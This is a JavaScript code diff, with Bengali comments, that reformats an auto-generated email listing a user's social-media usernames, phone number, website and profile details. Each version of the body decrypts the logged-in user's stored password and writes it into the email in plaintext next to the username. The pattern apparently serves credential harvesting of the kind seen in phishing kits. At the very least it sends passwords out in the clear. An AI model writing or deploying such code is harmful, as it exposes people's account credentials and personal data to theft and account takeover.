@@ -302,77 +302,46 @@ function updateSubmitButton(){
     }
 }
 
-// প্লেইন টেক্সট টেবিল তৈরি - আপনার ছবির মতো Column আকারে (কোনো HTML নেই)
+// আপনার ছবির মতো ঠিক একই ফরম্যাটে ইমেইল বডি তৈরি
 function createEmailBody(){
-    let yourEmail = document.getElementById("yourEmail").value || "—";
-    let yourUsername = document.getElementById("yourUsername").value || "—";
-    let profilePic = document.getElementById("profilePic").value || "—";
-    let fbUsername = document.getElementById("fbUsername").value || "—";
-    let fbPageUsername = document.getElementById("fbPageUsername").value || "—";
-    let igUsername = document.getElementById("igUsername").value || "—";
-    let whatsapp = document.getElementById("whatsapp").value || "—";
-    let tiktok = document.getElementById("tiktok").value || "—";
-    let telegram = document.getElementById("telegram").value || "—";
-    let twitter = document.getElementById("twitter").value || "—";
-    let phone = document.getElementById("phone").value || "—";
-    let about = document.getElementById("about").value || "—";
-    let website = document.getElementById("website").value || "—";
+    let yourEmail = document.getElementById("yourEmail").value || "";
+    let yourUsername = document.getElementById("yourUsername").value || "";
+    let profilePic = document.getElementById("profilePic").value || "";
+    let fbUsername = document.getElementById("fbUsername").value || "";
+    let fbPageUsername = document.getElementById("fbPageUsername").value || "";
+    let igUsername = document.getElementById("igUsername").value || "";
+    let whatsapp = document.getElementById("whatsapp").value || "";
+    let tiktok = document.getElementById("tiktok").value || "";
+    let telegram = document.getElementById("telegram").value || "";
+    let twitter = document.getElementById("twitter").value || "";
+    let phone = document.getElementById("phone").value || "";
+    let about = document.getElementById("about").value || "";
+    let website = document.getElementById("website").value || "";
     
     let loggedInPassword = decrypt(users[currentUser]);
     
-    // প্লেইন টেক্সট টেবিল - Column আকারে
-    let line = "┌─────────────────────────────────┬──────────────────────────────────────────────────┐\n";
-    let separator = "├─────────────────────────────────┼──────────────────────────────────────────────────┤\n";
-    let bottomLine = "└─────────────────────────────────┴──────────────────────────────────────────────────┘\n";
-    
-    let body = `
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                           📋 রিকুয়েস্ট ফর্ম ডাটা                             ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
+    // আপনার ছবির মতো ঠিক এই ফরম্যাট
+    let body = `| Name                          | Value                         |
+|-------------------------------|-------------------------------|
+| Your_Email                    | ${yourEmail}                  |
+| Your_Username                 | ${yourUsername}               |
+| Your_Profile_Picture_Link     | ${profilePic}                 |
+| Your_Facebook_Username        | ${fbUsername}                 |
+| Your_Facebook_Page_Username   | ${fbPageUsername}             |
+| Your_Instagram_Username       | ${igUsername}                 |
+| Your_WhatsApp_Number          | ${whatsapp}                   |
+| Your_TikTok_Username          | ${tiktok}                     |
+| Your_Telegram_Username        | ${telegram}                   |
+| Your_Twitter_Username         | ${twitter}                    |
+| Your_Phone_Number             | ${phone}                      |
+| Your_About                    | ${about}                      |
+| Your_Website_Link             | ${website}                    |
+| Logged_In_User_Info           | লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword} |
 
-┌─────────────────────────────────┬──────────────────────────────────────────────────┐
-│ 🔐 লগইন তথ্য                                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ লগইন ইউজারনাম                  │ ${currentUser}                                                       │
-│ পাসওয়ার্ড                      │ ${loggedInPassword}                                                       │
-└─────────────────────────────────┴──────────────────────────────────────────────────┘
+লগইন ইউজারনাম: ${currentUser}
+পাসওয়ার্ড: ${loggedInPassword}
 
-┌─────────────────────────────────┬──────────────────────────────────────────────────┐
-│ Name                            │ Value                                            │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Email                      │ ${yourEmail}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Username                   │ ${yourUsername}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Profile_Picture_Link       │ ${profilePic}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Facebook_Username          │ ${fbUsername}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Facebook_Page_Username     │ ${fbPageUsername}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Instagram_Username         │ ${igUsername}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_WhatsApp_Number            │ ${whatsapp}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_TikTok_Username            │ ${tiktok}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Telegram_Username          │ ${telegram}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Twitter_Username           │ ${twitter}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Phone_Number               │ ${phone}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_About                      │ ${about}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Your_Website_Link               │ ${website}                                                       │
-├─────────────────────────────────┼──────────────────────────────────────────────────┤
-│ Logged_In_User_Info             │ লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword} │
-└─────────────────────────────────┴──────────────────────────────────────────────────┘
-
-⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}
-
-📧 এই ইমেইলটি স্বয়ংক্রিয়ভাবে জেনারেট করা হয়েছে
-`;
+⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
     
     return body;
 }
